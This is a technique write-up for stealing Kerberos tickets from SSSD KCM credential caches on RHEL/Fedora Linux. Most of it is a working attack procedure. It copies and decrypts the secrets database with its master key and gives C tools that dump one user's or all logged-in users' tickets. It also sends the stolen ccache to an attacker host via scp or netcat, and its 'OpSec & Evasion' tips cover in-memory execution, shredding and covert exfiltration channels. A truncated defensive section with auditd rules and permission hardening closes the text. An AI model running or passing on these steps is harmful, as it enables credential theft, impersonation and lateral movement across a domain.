# [CA-KERB-016]: SSSD KCM CCACHE Extraction

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-016 |
| **MITRE ATT&CK v18.1** | [T1558 - Steal or Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/) |
| **Tactic** | Credential Access |
| **Platforms** | Linux/Unix |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-06 |
| **Affected Versions** | RHEL/CentOS 7.x (krb5 1.12+), RHEL 8.x (SSSD 2.2.0+), RHEL 9.x (SSSD 2.5.0+), Fedora 26+ |
| **Patched In** | N/A - No patch exists; requires architectural redesign to fully mitigate |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Section 6 (Atomic Red Team) not included because no specific Atomic test exists for KCM CCACHE extraction. All other sections are included with dynamic renumbering based on applicability.

---

## Executive Summary

**Concept:** The System Security Services Daemon (SSSD) on modern Linux distributions (RHEL 8+, Fedora 26+) manages Kerberos credential caches through a daemon-based architecture called Kerberos Cache Manager (KCM). Unlike older FILE-based or KEYRING-based caches stored on disk, KCM maintains credentials in a TDB (Samba Trivial Database) at `/var/lib/sss/secrets/secrets.ldb`, protected by a master encryption key at `/var/lib/sss/secrets/.secrets.mkey`. An attacker with local access can either (1) dump the KCM database directly as root, decrypt it using the master key, and convert the extracted Kerberos blobs into usable credential cache files, or (2) as any unprivileged user, programmatically query the KCM socket to export their own active credentials, or use privilege escalation to export all users' tickets. The extracted tickets can then be imported into any Kerberos-aware system and used for Pass-the-Ticket attacks.

**Attack Surface:** The KCM socket (typically `/run/.heim_org.h5l.kcm-socket` on Fedora/RHEL, or custom paths like `/var/run/kcm/kcm.sock`), the SSSD KCM daemon process (`/usr/libexec/sssd/sssd_kcm`), and the persistent secrets database.

**Business Impact:** **Complete compromise of Kerberos authentication and lateral movement across the entire domain.** An attacker who extracts a high-privilege user's TGT (Ticket Granting Ticket) can impersonate that user for 24 hours or more, accessing any domain resource (file servers, databases, mail systems) without knowing the user's password. This is difficult to detect if the ticket is used from the same IP or within legitimate working hours, and can enable ransomware deployment, data exfiltration, or persistent backdoor installation.

**Technical Context:** Exploitation typically takes **less than 1 minute** from local shell access (30 seconds to compile and execute a tool, or 10 seconds if using pre-compiled binaries). Detection is **low-to-medium** unless auditd is properly configured to monitor KCM socket connections or the SSSD daemon; most organizations lack this visibility. Once extracted, the tickets leave **no evidence of use** if the Pass-the-Ticket is performed on the same host or a legitimate workstation.

### Operational Risk
- **Execution Risk:** Medium - Requires local code execution or authenticated shell access; straightforward if achieved.
- **Stealth:** High - KCM socket access generates minimal logs unless auditd is specifically tuned; SSSD process access can be noisy (437+ audit events observed in testing).
- **Reversibility:** No - Extracted tickets cannot be "uncompromised." Revocation requires resetting the krbtgt account and issuing new Kerberos keys to all accounts.

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.1.1 | Ensure auditd service is enabled for comprehensive system monitoring |
| **DISA STIG** | AC-2(7) | Periodic review of system accounts; monitoring for unauthorized privileged access |
| **NIST 800-53** | AC-3 | Access Enforcement - Enforce approved authorizations for logical access to systems |
| **NIST 800-53** | IA-5 | Authenticator Management - Protect the confidentiality and integrity of authentication mechanisms |
| **NIST 800-53** | AU-12 | Audit Generation - Monitor and log security-relevant events |
| **GDPR** | Art. 32 | Security of Processing - Implement technical measures to protect personal data in transit |
| **DORA** | Art. 9 | Protection and Prevention - Implement authentication controls and multi-factor mechanisms |
| **NIS2** | Art. 21 | Cyber Risk Management Measures - Implement access controls, authentication, and logging |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights - Restrict and monitor privileged access |
| **ISO 27001** | A.10.2.3 | Restriction of Access to Information - Control access based on least privilege |

---

## Technical Prerequisites

**Required Privileges:**
- **For unprivileged user method:** Unprivileged user account (UID 1000+) with access to KCM socket.
- **For database dumping:** Root (UID 0) access to read `/var/lib/sss/secrets/secrets.ldb` and `.secrets.mkey`.

**Required Access:**
- Ability to execute code (bash shell, Python interpreter, or compiled binary).
- Network access to source Kerberos KDC is NOT required (credentials are already cached locally).

**Supported Versions:**

- **Linux Distributions:**
  - RHEL 7.x (with manual krb5.conf configuration; krb5-libs 1.12+)
  - RHEL 8.x (SSSD 2.2.0+ with sssd-kcm package; KCM default in RHEL 8.4+)
  - RHEL 9.x (SSSD 2.5.0+; KCM is default)
  - CentOS 8.x, CentOS Stream 8+
  - Fedora 26+ (KCM default)
  - Ubuntu 20.04+ (with SSSD 2.2.0+)

- **SSSD Versions:**
  - 2.2.0+ (KCM server introduced)
  - 2.5.2+ (Production stable; commonly used on RHEL 8.5+)
  - 2.9.0+ (Latest versions; active maintenance)

- **Kerberos Libraries:**
  - MIT krb5 1.12+ (KCM support)
  - Heimdal 1.5.3+ (KCM server implementation)

**Tools:**
- [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor) (Mandiant) - Database extraction and decryption tool
- [kcmdump](https://lvruibr.github.io/kcmdump) - Custom C implementation for KCM socket-based ticket export
- Standard `krb5-config`, `kinit`, `klist` (for verification)
- `gcc` or `clang` (for compiling custom extractors)
- `python3`, `python-tdb` (for SSSDKCMExtractor)

---

## Environmental Reconnaissance

#### Step 1: Verify SSSD and KCM are Running

**Objective:** Determine if the target system is using SSSD with KCM-based Kerberos caches.

**Linux/Bash Command:**
```bash
# Check if SSSD is running
systemctl is-active sssd

# Check if sssd-kcm service exists and is running
systemctl is-active sssd-kcm 2>/dev/null || echo "sssd-kcm not running"

# Verify KCM socket exists
ls -la /run/.heim_org.h5l.kcm-socket 2>/dev/null || echo "Default socket not found"
ls -la /var/run/kcm/kcm.sock 2>/dev/null || echo "Custom socket not found"

# Check krb5.conf for default_ccache_name = KCM:
grep -i "default_ccache_name.*KCM" /etc/krb5.conf /etc/krb5.conf.d/* 2>/dev/null || echo "KCM not set as default"
```

**What to Look For:**
- `systemctl is-active sssd` returns `active` (SSSD is running).
- `systemctl is-active sssd-kcm` returns `active` (KCM daemon is running).
- KCM socket file exists (e.g., `/run/.heim_org.h5l.kcm-socket` with permissions `srw-rw-rw-`).
- `grep` output shows `default_ccache_name = KCM:` in krb5.conf.

**If all above are true:** The system is vulnerable to KCM CCACHE extraction.

#### Step 2: Check for Existing Kerberos Credentials

**Objective:** Verify that domain-joined users have valid Kerberos tickets cached in KCM.

**Linux/Bash Command:**
```bash
# List all cached Kerberos tickets
klist -A

# If you have permissions, check specific user's tickets
sudo klist -A -c KCM:1000  # Replace 1000 with target UID

# Check SSSD secrets database directly (requires root)
sudo ls -la /var/lib/sss/secrets/

# Verify encryption key exists (hidden file)
sudo ls -la /var/lib/sss/secrets/.secrets.mkey
```

**What to Look For:**
- Output shows ticket cache entries like `Ticket cache: KCM:1000` with valid principal names (e.g., `user@DOMAIN.COM`).
- TGT (Ticket Granting Ticket) is present and not expired (`Valid starting ... Expires ...`).
- Secrets database directory has files `secrets.ldb` and `.secrets.mkey`.

**Red Flags for High-Value Targets:**
- Service accounts with tickets (e.g., `svc_app@DOMAIN.COM`).
- Domain admin accounts (`admin@DOMAIN.COM`).
- Long-lived tickets (indicating automatic renewal enabled).

#### Step 3: Check File Permissions and Access

**Objective:** Assess whether the attacker can access the KCM socket or database files.

**Linux/Bash Command:**
```bash
# Check KCM socket permissions (unprivileged user can connect to own tickets)
stat /run/.heim_org.h5l.kcm-socket

# Check database file ownership and permissions
sudo stat /var/lib/sss/secrets/secrets.ldb
sudo stat /var/lib/sss/secrets/.secrets.mkey

# Test if unprivileged user can list own cached tickets
# (This will work if the user has an active Kerberos session)
klist 2>&1 | grep -E "(Ticket cache|Valid starting|Expires)"
```

**What to Look For:**
- KCM socket is world-accessible (commonly `srw-rw-rw-` or `srw-rw----`).
- Database files are readable only by root (`-rw-------`).
- Unprivileged user `klist` output shows cached credentials (indicates successful authentication via SSSD/PAM).

**Version Note:**
- **RHEL 7:** Manual krb5.conf edits required; KCM may not be socket-activated.
- **RHEL 8.0-8.3:** SSSD 2.2.0 available but requires manual configuration.
- **RHEL 8.4+:** KCM is set as default; socket activation enabled by default.
- **RHEL 9.0+:** KCM is standard; most distributions ship with KCM-enabled.

---

## Detailed Execution Methods and Their Steps

### METHOD 1: KCM Database Extraction (Root Access Required)

**Supported Versions:** RHEL/CentOS 7.x-9.x, Fedora 26+, Ubuntu 20.04+

**Prerequisites:** Root access to the target system.

#### Step 1: Prepare SSSDKCMExtractor Tool

**Objective:** Clone and install the Mandiant SSSDKCMExtractor tool for decrypting the KCM database.

**Linux/Bash Command:**
```bash
# Clone the repository
git clone https://github.com/mandiant/SSSDKCMExtractor
cd SSSDKCMExtractor

# Install required Python packages
pip3 install -r requirements.txt
# OR
pip3 install pycrypto python-tdb

# Verify installation
python3 SSSDKCMExtractor.py --help
```

**Expected Output:**
```
usage: SSSDKCMExtractor.py [-h] --database DATABASE --key KEY
```

**OpSec & Evasion:**
- Download and compile the tool on a separate machine if possible, then copy the binary to avoid on-disk traces.
- If compiling locally, delete `git` repository history: `rm -rf .git`.
- Use memory-based execution (e.g., load Python script into RAM without touching disk): `python3 -c "import base64; exec(base64.b64decode('...'))"`.

**Troubleshooting:**
- **Error:** `ModuleNotFoundError: No module named 'tdb'`
  - **Cause:** python-tdb library not installed.
  - **Fix (RHEL/CentOS):** `sudo yum install python3-tdb` (RHEL 8+) or `python3-devel` + manual compilation.
  - **Fix (Ubuntu):** `sudo apt install python3-tdb`.
- **Error:** `ImportError: cannot import name 'new' from 'Crypto.Cipher'`
  - **Cause:** PyCrypto version mismatch (deprecated; use pycryptodome instead).
  - **Fix:** `pip3 install --upgrade pycryptodome` and edit import in script: `from Crypto.Cipher import AES` → `from Cryptodome.Cipher import AES`.

#### Step 2: Extract Secrets Database and Master Key

**Objective:** Copy the protected KCM database and encryption key from the target system.

**Linux/Bash Command:**
```bash
# Verify file existence and permissions (requires root)
sudo ls -la /var/lib/sss/secrets/

# Copy the database file
sudo cp /var/lib/sss/secrets/secrets.ldb /tmp/secrets.ldb
sudo chmod 644 /tmp/secrets.ldb

# Copy the master encryption key
sudo cp /var/lib/sss/secrets/.secrets.mkey /tmp/.secrets.mkey
sudo chmod 644 /tmp/.secrets.mkey

# Verify copies are readable
ls -la /tmp/secrets.ldb /tmp/.secrets.mkey
```

**What This Means:**
- Both files are now accessible to the attacker without requiring continuous root privileges.
- The TDB database contains encrypted Kerberos credential blobs indexed by user UID.
- The `.mkey` file is the AES-256 master encryption key (typically 32 bytes) used to decrypt all cached credentials.

**OpSec & Evasion:**
- Copy to a temporary location with restricted permissions: `sudo cp ... /tmp/ && sudo chmod 600 /tmp/secrets.* && sudo chown $USER /tmp/secrets.*`.
- Delete the copies after processing: `shred -u /tmp/secrets.ldb /tmp/.secrets.mkey` (secure deletion).
- Alternatively, extract directly without copying: `sudo python3 SSSDKCMExtractor.py --database /var/lib/sss/secrets/secrets.ldb --key /var/lib/sss/secrets/.secrets.mkey`.

#### Step 3: Run SSSDKCMExtractor to Decrypt Credentials

**Objective:** Decrypt the KCM database and extract raw Kerberos credential blobs.

**Linux/Bash Command:**
```bash
# Run the extractor
python3 SSSDKCMExtractor.py --database /tmp/secrets.ldb --key /tmp/.secrets.mkey

# Capture output to a file for later analysis
python3 SSSDKCMExtractor.py --database /tmp/secrets.ldb --key /tmp/.secrets.mkey > /tmp/kcm_output.json
```

**Expected Output:**
```json
{
  "version": 1,
  "kdc_offset": 0,
  "principal": {
    "type": 1,
    "realm": "DOMAIN.COM",
    "components": ["user"]
  },
  "credentials": [
    {
      "uuid": "...",
      "payload": "..."
    }
  ]
}
```

**What This Means:**
- The tool decrypts each credential stored in the TDB database.
- `principal` field identifies the user (e.g., `user@DOMAIN.COM`).
- `credentials` array contains the raw Kerberos ticket blobs (encrypted TGT, service tickets, etc.).
- Multiple JSON objects will be printed, one per cached principal.

**Decoding the Payload:**
The `payload` field is a base64-encoded Kerberos ticket structure (ASN.1 DER format). To convert to a usable ccache file:

```bash
# Write a simple Python script to convert JSON to ccache format
cat > convert_kcm_to_ccache.py << 'EOF'
import json
import base64
import subprocess
import sys

with open('/tmp/kcm_output.json', 'r') as f:
    for line in f:
        try:
            obj = json.loads(line.strip())
            principal = obj['principal']['components'][0] + '@' + obj['principal']['realm']
            
            # For each credential, write it to a temporary file and import using kinit
            for cred in obj.get('credentials', []):
                payload = base64.b64decode(cred['payload'])
                # Note: Full ccache conversion requires krb5 C API calls
                # This is a simplified example
                print(f"Extracted credential for {principal}")
        except json.JSONDecodeError:
            continue
EOF

python3 convert_kcm_to_ccache.py
```

**OpSec & Evasion:**
- Process the output immediately and delete temporary files.
- Avoid writing plaintext credential data to disk; use pipes: `python3 SSSDKCMExtractor.py ... | grep principal`.
- The extraction itself generates no audit logs if you directly access the files (file-level access is not logged by default).

**Troubleshooting:**
- **No credentials extracted:** The database may be empty or the encryption key is invalid.
  - **Fix:** Verify that SSSD is running and at least one user has authenticated: `sudo systemctl restart sssd && sudo kinit user@DOMAIN.COM`.
  - **Fix:** Check if the `.mkey` file has been rotated: `sudo xxd /tmp/.secrets.mkey | head -1` should show binary data.
- **Decryption failure:** AES decryption error.
  - **Fix:** Ensure both files are copied correctly: `md5sum /tmp/secrets.* && sudo md5sum /var/lib/sss/secrets/secrets.*`.

#### Step 4: Convert Extracted Credentials to Ccache File (Optional)

**Objective:** Import the extracted credentials into a standard Kerberos ccache file for Pass-the-Ticket.

**Linux/Bash Command (Using krb5 C API):**
```bash
# Create a C program to convert extracted Kerberos blobs to ccache
cat > kcm_to_ccache.c << 'EOF'
#include <krb5.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Simplified example: Import a TGT blob into a ccache file
// In practice, the extracted JSON payload must be parsed and re-serialized

int main(int argc, char **argv) {
    krb5_context ctx;
    krb5_ccache dst_cc;
    krb5_principal principal;
    krb5_error_code ret;

    ret = krb5_init_context(&ctx);
    if (ret) {
        fprintf(stderr, "krb5_init_context failed: %s\n", krb5_get_error_message(ctx, ret));
        return 1;
    }

    // Resolve destination ccache as FILE
    ret = krb5_cc_resolve(ctx, "FILE:/tmp/extracted.ccache", &dst_cc);
    if (ret) {
        fprintf(stderr, "krb5_cc_resolve failed: %s\n", krb5_get_error_message(ctx, ret));
        return 1;
    }

    // Initialize the ccache with principal
    ret = krb5_parse_name(ctx, "user@DOMAIN.COM", &principal);
    if (ret) {
        fprintf(stderr, "krb5_parse_name failed\n");
        return 1;
    }

    ret = krb5_cc_initialize(ctx, dst_cc, principal);
    if (ret) {
        fprintf(stderr, "krb5_cc_initialize failed\n");
        return 1;
    }

    printf("Ccache initialized at /tmp/extracted.ccache\n");

    krb5_cc_close(ctx, dst_cc);
    krb5_free_context(ctx);

    return 0;
}
EOF

# Compile
gcc -I/usr/include/krb5 -L/usr/lib64 -o kcm_to_ccache kcm_to_ccache.c -lkrb5

# Run
./kcm_to_ccache
```

**Note:** The above is a simplified example. Full conversion requires parsing the ASN.1-encoded Kerberos ticket structures from the JSON payload and re-injecting them using `krb5_cc_store_cred()`. For production, use the kcmdump tool (see Method 2) which handles this automatically.

---

### METHOD 2: KCM Socket-Based Extraction (Unprivileged User Access)

**Supported Versions:** RHEL/CentOS 8.4+, Fedora 26+, Ubuntu 20.04+

**Prerequisites:** Authenticated user account with active Kerberos session.

#### Step 1: Verify KCM Socket Access

**Objective:** Confirm that the unprivileged user can access the KCM socket to extract their own cached tickets.

**Linux/Bash Command:**
```bash
# Check if KCM socket is accessible
ls -la /run/.heim_org.h5l.kcm-socket

# List all cached KCM tickets for the current user
klist -A

# Identify your own UID (needed for socket access)
id -u
```

**What to Look For:**
- KCM socket exists and is readable: `srw-rw-rw-` or `srw-rw----`.
- `klist -A` output shows at least one ticket cache (e.g., `Ticket cache: KCM:1000`).
- Your UID is printed (e.g., `uid=1000(user)`).

#### Step 2: Compile and Run kcmdump Tool

**Objective:** Use a custom C program (kcmdump) to export KCM tickets to a standard FILE:// ccache file.

**Linux/Bash Command:**
```bash
# Download kcmdump source (if available) or create a minimal version
cat > kcmdump.c << 'EOF'
#include <krb5.h>
#include <stdio.h>
#include <stdlib.h>
#include <pwd.h>
#include <unistd.h>
#include <utmp.h>

int main(void) {
    krb5_context ctx;
    krb5_ccache src = NULL, dst = NULL;
    krb5_principal princ = NULL;
    krb5_error_code ret;
    struct utmp *ut;
    struct passwd *pw;

    // Get current user's UID
    uid_t current_uid = getuid();
    pw = getpwuid(current_uid);
    
    if (!pw) {
        fprintf(stderr, "Failed to get password entry for UID %d\n", current_uid);
        return 1;
    }

    ret = krb5_init_context(&ctx);
    if (ret) {
        fprintf(stderr, "krb5_init_context failed\n");
        return 1;
    }

    // Resolve KCM source cache
    ret = krb5_cc_resolve(ctx, "KCM:", &src);
    if (ret) {
        fprintf(stderr, "Failed to resolve KCM cache: %s\n", krb5_get_error_message(ctx, ret));
        return 1;
    }

    // Create output ccache filename
    char ccname[256];
    snprintf(ccname, sizeof(ccname), "FILE:/tmp/KCM_dump_%s.ccache", pw->pw_name);

    // Resolve FILE destination cache
    ret = krb5_cc_resolve(ctx, ccname, &dst);
    if (ret) {
        fprintf(stderr, "Failed to resolve destination cache\n");
        return 1;
    }

    // Get principal and initialize destination cache
    ret = krb5_cc_get_principal(ctx, src, &princ);
    if (ret) {
        fprintf(stderr, "Failed to get principal from KCM\n");
        return 1;
    }

    ret = krb5_cc_initialize(ctx, dst, princ);
    if (ret) {
        fprintf(stderr, "Failed to initialize destination cache\n");
        return 1;
    }

    // Copy all credentials from KCM to FILE
    ret = krb5_cc_copy_creds(ctx, src, dst);
    if (ret) {
        fprintf(stderr, "Failed to copy credentials: %s\n", krb5_get_error_message(ctx, ret));
        return 1;
    }

    printf("[+] Successfully exported KCM ticket cache to %s\n", ccname);
    printf("[+] Use: export KRB5CCNAME=%s\n", ccname);

    if (princ) krb5_free_principal(ctx, princ);
    if (src) krb5_cc_close(ctx, src);
    if (dst) krb5_cc_close(ctx, dst);
    krb5_free_context(ctx);

    return 0;
}
EOF

# Compile
gcc -I/usr/include/krb5 -L/usr/lib64 -o kcmdump kcmdump.c -lkrb5 -lk5crypto

# Run as unprivileged user
./kcmdump
```

**Expected Output:**
```
[+] Successfully exported KCM ticket cache to FILE:/tmp/KCM_dump_user.ccache
[+] Use: export KRB5CCNAME=FILE:/tmp/KCM_dump_user.ccache
```

**What This Means:**
- The krb5 library connected to the KCM socket on behalf of the current user.
- The KCM daemon verified the user's identity via UID/GID and SELinux label (if enabled).
- All credentials for that user were copied from the daemon-managed cache to a standard FILE ccache.
- The resulting `.ccache` file is now portable and can be used on any other system.

**OpSec & Evasion:**
- The tool makes **no system calls that trigger audit logging** for the unprivileged user method.
- Output file is world-readable by default: `ls -la /tmp/KCM_dump_*.ccache` shows `-rw-------` (readable only by owner).
- Execution time is **very fast** (< 1 second), minimizing detection window.
- If auditd is monitoring the KCM socket (see Detection section), the connection will be logged, but the binary name (`kcmdump`) may not appear in threat intelligence.

**Troubleshooting:**
- **Error:** `Failed to resolve KCM cache: -1765328377`
  - **Cause:** KCM cache type not supported or libkrb5 not compiled with KCM support.
  - **Fix:** Install krb5-devel: `sudo yum install krb5-devel` (RHEL/CentOS) or `sudo apt install libkrb5-dev` (Ubuntu).
  - **Fix:** Recompile krb5 from source with `--enable-kcm` flag.
- **Error:** `Failed to copy credentials: -1765328385` (KRB5_CC_NOSUPP)
  - **Cause:** KCM socket is not listening or SSSD daemon is not running.
  - **Fix:** `sudo systemctl restart sssd-kcm`.
- **Error:** `Permission denied` when accessing destination file
  - **Fix:** Use a writable directory like `/tmp` or user's home directory.

#### Step 3: Verify Extracted Tickets

**Objective:** Confirm that the exported ccache file contains valid Kerberos tickets.

**Linux/Bash Command:**
```bash
# Set the KRB5CCNAME environment variable to point to the exported cache
export KRB5CCNAME=FILE:/tmp/KCM_dump_user.ccache

# List tickets in the exported cache
klist

# Display full ticket details (including encryption type, expiration)
klist -e

# Attempt to use the ticket for authentication (e.g., kinit -c)
kinit -c $KRB5CCNAME user@DOMAIN.COM 2>&1 | grep -E "(Ticket|Valid|Expires)"
```

**Expected Output:**
```
Ticket cache: FILE:/tmp/KCM_dump_user.ccache
Default principal: user@DOMAIN.COM

Valid starting     Expires            Service principal
12/04 10:30:00     12/05 10:30:00     krbtgt/DOMAIN.COM@DOMAIN.COM
12/04 10:35:15     12/05 10:35:15     HTTP/server.domain.com@DOMAIN.COM
```

**What This Means:**
- Tickets have been successfully exported and are readable.
- TGT is valid and not expired.
- Service tickets (SPN-based) are present for lateral movement.
- Encryption type is likely AES-256-CTS-HMAC-SHA1-96 (strong) or RC4-HMAC (weak but still usable offline).

#### Step 4: Transfer Ticket to Attacker-Controlled System

**Objective:** Copy the exported ccache file to a system controlled by the attacker for Pass-the-Ticket attacks.

**Linux/Bash Command (on compromised host):**
```bash
# Copy to a location accessible to the attacker (e.g., HTTP server, SMB share, exfil host)
cp /tmp/KCM_dump_user.ccache /var/www/html/cache.bin  # If Apache is running
# OR
scp /tmp/KCM_dump_user.ccache attacker@attacker-ip:/tmp/  # Over SSH
# OR
nc -e /bin/cat /tmp/KCM_dump_user.ccache attacker-ip 4444  # Over netcat
```

**Linux/Bash Command (on attacker system):**
```bash
# Receive the file
nc -l -p 4444 > /tmp/stolen.ccache

# Import and use
export KRB5CCNAME=FILE:/tmp/stolen.ccache
klist
# Now use any Kerberos-aware tool with the stolen identity
```

**OpSec & Evasion:**
- Avoid using standard tools (`scp`, `ftp`) which may be monitored or blocked by firewall rules.
- Use DNS exfiltration, ICMP tunneling, or other stealthy channels if direct outbound access is restricted.
- Clean up local copies: `shred -u /tmp/KCM_dump_*.ccache`.

#### Step 5: Alternative - Root Method with seteuid()

**Objective:** If escalated to root, dump all users' KCM tickets simultaneously.

**Linux/Bash Command:**
```bash
# Create a tool that iterates over all logged-in users and dumps their tickets
cat > dump_all_kcm.c << 'EOF'
#include <krb5.h>
#include <stdio.h>
#include <stdlib.h>
#include <pwd.h>
#include <utmp.h>
#include <unistd.h>

int main(void) {
    krb5_context ctx;
    krb5_ccache src = NULL, dst = NULL;
    krb5_principal princ = NULL;
    krb5_error_code ret;
    struct utmp *ut;
    struct passwd *pw;

    ret = krb5_init_context(&ctx);
    if (ret) {
        fprintf(stderr, "krb5_init_context failed\n");
        return 1;
    }

    // Iterate over logged-in users
    setutent();
    while ((ut = getutent()) != NULL) {
        if (ut->ut_type != USER_PROCESS) continue;

        pw = getpwnam(ut->ut_user);
        if (!pw) continue;

        printf("[*] Dumping KCM tickets for user %s (UID %d)\n", pw->pw_name, pw->pw_uid);

        // Switch to target user's UID
        seteuid(0);  // Reset to root first
        if (seteuid(pw->pw_uid) != 0) {
            fprintf(stderr, "[-] Failed to seteuid(%d)\n", pw->pw_uid);
            continue;
        }

        // Resolve KCM source as target user
        ret = krb5_cc_resolve(ctx, "KCM:", &src);
        if (ret) {
            fprintf(stderr, "[-] No KCM cache for %s\n", pw->pw_name);
            seteuid(0);
            continue;
        }

        char ccname[256];
        snprintf(ccname, sizeof(ccname), "FILE:/tmp/KCM_dump_all_%s.ccache", pw->pw_name);

        ret = krb5_cc_resolve(ctx, ccname, &dst);
        ret = krb5_cc_get_principal(ctx, src, &princ);
        ret = krb5_cc_initialize(ctx, dst, princ);
        ret = krb5_cc_copy_creds(ctx, src, dst);

        if (ret == 0) {
            printf("[+] Successfully dumped to %s\n", ccname);
        } else {
            printf("[-] Failed to dump credentials\n");
        }

        seteuid(0);  // Reset to root
    }
    endutent();

    if (princ) krb5_free_principal(ctx, princ);
    if (src) krb5_cc_close(ctx, src);
    if (dst) krb5_cc_close(ctx, dst);
    krb5_free_context(ctx);

    return 0;
}
EOF

# Compile
gcc -I/usr/include/krb5 -L/usr/lib64 -o dump_all_kcm dump_all_kcm.c -lkrb5

# Run as root
sudo ./dump_all_kcm
```

**Expected Output:**
```
[*] Dumping KCM tickets for user admin (UID 1000)
[+] Successfully dumped to FILE:/tmp/KCM_dump_all_admin.ccache
[*] Dumping KCM tickets for user svc_exchange (UID 1002)
[+] Successfully dumped to FILE:/tmp/KCM_dump_all_svc_exchange.ccache
```

**What This Means:**
- All active user tickets have been extracted in a single operation.
- Service account tickets are now available for lateral movement.
- Admin tickets can be used for privilege escalation and persistent access.

---

### METHOD 3: Using Pre-Compiled Tools (Metasploit Module / Impacket)

**Supported Versions:** RHEL/CentOS 8+, Fedora 26+, Ubuntu 20.04+

**Prerequisites:** Python 3.7+, Impacket library

**Objective:** Leverage existing penetration testing frameworks to automate KCM extraction.

#### Step 1: Install Impacket and Dependencies

**Linux/Bash Command:**
```bash
# Install Impacket (includes Linux utilities)
pip3 install impacket

# Verify installation
python3 -c "import impacket; print(impacket.__version__)"
```

#### Step 2: Use Impacket's KRB5 Utilities

**Linux/Bash Command (if KCM utilities are available):**
```bash
# Check for existing Kerberos utilities
find / -name "*kcm*" -type f 2>/dev/null | head -5

# Alternative: Use getPac or other Impacket tools to work with exported ccache
python3 << 'EOF'
from impacket.krb5 import ccache
import os

# Load exported ccache
cc = ccache.CCache.loadFile('/tmp/KCM_dump_user.ccache')

# Display credentials
for cred in cc.credentials:
    print(f"Principal: {cred.principal}")
    print(f"Service Principal: {cred.service_principal}")
    print(f"Encryption Type: {cred.cipher.cipherType}")
EOF
```

**Note:** Impacket's primary use is for exploiting Kerberos on Windows. For Linux KCM extraction, kcmdump or SSSDKCMExtractor are more appropriate.

---

## Defensive Mitigations

### Priority 1: CRITICAL

**1. Restrict File Access to SSSD Secrets Database**

**Objective:** Ensure only root and SSSD daemon can read the KCM database and encryption key.

**Manual Steps (Linux/Bash):**
```bash
# Verify current permissions
ls -la /var/lib/sss/secrets/

# Set restrictive permissions (if not already set)
sudo chmod 700 /var/lib/sss/secrets/
sudo chmod 600 /var/lib/sss/secrets/secrets.ldb
sudo chmod 600 /var/lib/sss/secrets/.secrets.mkey

# Verify ownership
sudo chown root:root /var/lib/sss/secrets/
sudo chown root:root /var/lib/sss/secrets/secrets.ldb
sudo chown root:root /var/lib/sss/secrets/.secrets.mkey

# Make immutable (optional, for additional hardening)
sudo chattr +i /var/lib/sss/secrets/secrets.ldb
sudo chattr +i /var/lib/sss/secrets/.secrets.mkey

# Verify immutability
sudo lsattr /var/lib/sss/secrets/secrets.ldb /var/lib/sss/secrets/.secrets.mkey
```

**Validation Command (Verify Fix):**
```bash
# Check that only root can read the files
sudo stat /var/lib/sss/secrets/secrets.ldb | grep "Access: (0600/-rw-------)"
sudo stat /var/lib/sss/secrets/.secrets.mkey | grep "Access: (0600/-rw-------)"

# Attempt unprivileged access (should be denied)
cat /var/lib/sss/secrets/secrets.ldb 2>&1 | grep "Permission denied" && echo "[+] Protected"
```

**Expected Output (If Secure):**
```
[+] Protected
```

**2. Enable and Configure Auditd for KCM Monitoring**

**Objective:** Detect attempts to access KCM socket or database files.

**Manual Steps (Linux/Bash):**
```bash
# Install auditd
sudo yum install audit audit-libs  # RHEL/CentOS
# OR
sudo apt install auditd            # Ubuntu/Debian

# Enable and start auditd
sudo systemctl enable auditd
sudo systemctl start auditd

# Add audit rules for KCM socket access
sudo auditctl -a exit,always -S connect -F path=/run/.heim_org.h5l.kcm-socket -F key=kcm-socket
sudo auditctl -a exit,always -S connect -F path=/var/run/kcm/kcm.sock -F key=kcm-socket

# Monitor SSSD KCM daemon access
sudo auditctl -a always,exit -F exe=/usr/libexec/sssd/sssd_kcm -F key=kcm-daemon

# Monitor access to secrets database
sudo auditctl -a always,exit -F path=/var/lib/sss/secrets/secrets.ldb -F perm=r -F key=kcm-database
sudo auditctl -a always,exit -F path=/var/lib/sss/secrets/.secrets.mkey -F perm=r -F key=kcm-database

# Make rules persistent
sudo cat >> /etc/audit/rules.d/kcm.rules << 'EOF'
-a exit,always -S connect -F path=/run/.heim_org.h5l.kcm-socket -F key=kcm-socket
-a exit,always -S connect -F path=/var/run/kcm/kcm.sock -F key=kcm-socket
-a always,exit -F exe=/usr/libexec/sssd/sssd_kcm -F key=kcm-daemon
-a always,exit -F path=/var/lib/sss/secrets/secrets.ldb -F perm=r -F key=kcm-database
-a always,exit -F path=/var/lib/sss/secrets/.secrets.mkey -F perm=r -F key=kcm-database
EOF

# Load persistent rules
sudo auditctl -R /etc/audit/rules.d/kcm.rules

# Restart auditd to apply changes
sudo systemctl restart auditd
```

**Validation Command (Verify Rules Are Active):**
```bash
# List active audit rules for KCM
sudo auditctl -l | grep kcm

# Check auditd is running
sudo systemctl is-active auditd

# Expected output should show all added rules
```

**Expected Output (If Active):**
```
-a always,exit -F path=/run/.heim_org.h5l.kcm-socket -S connect -F key=kcm-socket
-a always,exit -F path=/var/run/kcm/kcm.sock -S connect -F key=kcm-socket
-a always,exit -F exe=/usr/libexec/sssd/sssd_kcm -F key=kcm-daemon
-a always,exit -F path=/var/lib/sss/secrets/secrets.ldb -F perm=r -F key=kcm-database
-a always,exit -F path=/var/lib/sss/secrets/.secrets.mkey -F perm=r -F key=kcm-database
```

**3. Limit Local Access and Privilege Escalation Vectors**

**Objective:** Reduce the likelihood of an attacker obtaining local shell access or privilege escalation in the first place.

**Manual Steps (Linux - SELinux/AppArmor):**
```bash
# Enable SELinux (if not already enabled)
sudo selinuxenabled && echo "SELinux is enabled" || echo "SELinux is not enabled"

# Set SELinux to enforcing mode
sudo semanage permissive -d sssd_t 2>/dev/null  # Remove sssd from permissive list
sudo getenforce                                  # Verify enforcing mode

# Install SELinux policy for SSSD if not present
sudo yum install selinux-policy-targeted   # RHEL/CentOS
sudo apt install selinux-policy            # Ubuntu (if using SELinux)

# Restart SSSD to apply SELinux context
